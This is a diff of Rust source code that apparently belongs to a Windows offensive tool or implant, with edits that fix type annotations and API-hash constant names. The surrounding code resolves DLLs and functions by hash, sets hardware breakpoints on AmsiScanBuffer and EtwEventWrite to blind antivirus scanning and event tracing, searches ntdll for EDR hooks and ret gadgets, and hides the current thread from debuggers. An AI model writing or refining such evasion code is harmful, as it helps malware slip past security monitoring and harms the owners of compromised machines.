@@ -36,9 +36,9 @@ unsafe extern "system" fn veh_handler(exception_info: *mut winapi::um::winnt::EX
             // Use NtClose as a known, small syscall stub to safely find a 'ret' (0xC3) 
             // gadget without hitting false positives in complex instructions.
             let mut ptr = rip as *const u8; // Fallback to current rip if resolving fails
-            let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
+            let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
             if !ntdll.is_null() {
-                let nt_close = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NtClose).unwrap_or(0) as _;
+                let nt_close = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTCLOSE).unwrap_or(0) as _;
                 if !nt_close.is_null() {
                     let p = nt_close as *const u8;
                     // Check if NtClose starts with E9 (jmp), which typically indicates an EDR hook
@@ -73,7 +73,7 @@ pub unsafe fn setup_hardware_breakpoints() {
 
     let mut configured = false;
 
-    let amsi = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
+    let amsi: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_AMSI_DLL).unwrap_or(0) as *mut _;
     if !amsi.is_null() {
         let addr = pe_resolve::get_proc_address_by_hash(amsi as usize, pe_resolve::HASH_AMSISCANBUFFER).unwrap_or(0) as *mut _;
         if !addr.is_null() {
@@ -82,7 +82,7 @@ pub unsafe fn setup_hardware_breakpoints() {
         }
     }
 
-    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
+    let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as *mut _;
     if !ntdll.is_null() {
         let addr = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_ETWEVENTWRITE).unwrap_or(0) as *mut _;
         if !addr.is_null() {
@@ -147,9 +147,9 @@ pub unsafe fn patch_amsi() {}
 #[cfg(windows)]
 pub fn hide_current_thread() {
     unsafe {
-        let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
+        let ntdll: *mut winapi::ctypes::c_void = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) as _;
         if !ntdll.is_null() {
-            let func = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NtSetInformationThread).unwrap_or(0) as _;
+            let func = pe_resolve::get_proc_address_by_hash(ntdll as usize, pe_resolve::HASH_NTSETINFORMATIONTHREAD).unwrap_or(0) as _;
             if !func.is_null() {
                 let nt_set_info_thread: extern "system" fn(winapi::um::winnt::HANDLE, u32, *mut winapi::ctypes::c_void, u32) -> i32 = std::mem::transmute(func);
                 nt_set_info_thread(
